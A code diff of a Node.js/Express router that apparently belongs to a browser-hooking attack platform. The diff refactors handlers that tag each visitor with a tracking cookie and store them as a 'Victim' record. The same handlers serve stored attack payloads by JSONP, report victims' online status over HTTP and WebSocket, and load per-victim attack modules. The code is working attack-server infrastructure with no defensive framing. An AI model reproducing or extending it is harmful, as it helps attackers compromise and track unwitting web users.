@@ -6,7 +6,7 @@ router.all('/', function(req, res){
     return res.render('index', {
         protocol:config.ssl?'':'http',
         host:config.host||req.header('host'),
-        id:req.query.i||''
+        id:req.query.i||'1'
     });
 });
 
@@ -15,21 +15,15 @@ router.all('/i/', function(req, res){
     var id = req.param('i');
     var who = req.cookies.who;
     sql.Victim.findOne({who:who}, function(err, info){
-        if(info){
-            return res.jsonp(info.load);
-        };
+        if(info)return res.jsonp(info.load);
         sql.Item.findById(id, function(err, info){
-            if(!info){
-                return res.jsonp({
-                    'err':404
-                });
-            };
-            who = getmd5(info.owner+id+Date.now());
+            if(!info)return res.jsonp({'err':404});
+            who = sql.hash(info.owner+id+Date.now());
             res.cookie('who', who);
             sql.Victim.create({
                 owner:info.owner,
                 who:who,
-                name:info.name+Date.now(),
+                name:info.name+'_'+Date.now(),
                 payload:info.payload,
                 modules:info.modules,
                 status:{},
@@ -52,9 +46,15 @@ function handle(req, res, modules, owner, victim, who, type){
     var share = {};
     var path = fs.realpathSync('.');
     for(var i in modules){
-        var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]);
         if(typeof share[modules[i][0]] != 'object'){
             share[modules[i][0]] = [];
+        };
+        try{
+            if(!fs.lstatSync(path+'/'+modules[i][0]).isDirectory())throw 'path error.';
+            var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]);
+        }catch(e){
+            share[modules[i][0]].unshift({'err':e});
+            continue
         };
         share[modules[i][0]].unshift(
             m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:owner, t:type})
@@ -66,7 +66,7 @@ var http = function(req, res){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info){return err404(req, res)};
+        if(!info)return err404(req, res);
         var owner = req.session.user&&(req.session.user.name == info.owner);
         !owner&&online(who, Date.now());
         handle(req, res, info.modules, owner, sql.Victim, who, 'http');
@@ -79,7 +79,7 @@ exports.ws = function(ws, req){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info){return null};
+        if(!info)return null;
         var owner = req.session.user&&(req.session.user.name == info.owner);
         ws.on('open', function(){
             return !owner&&online(who, 'online');
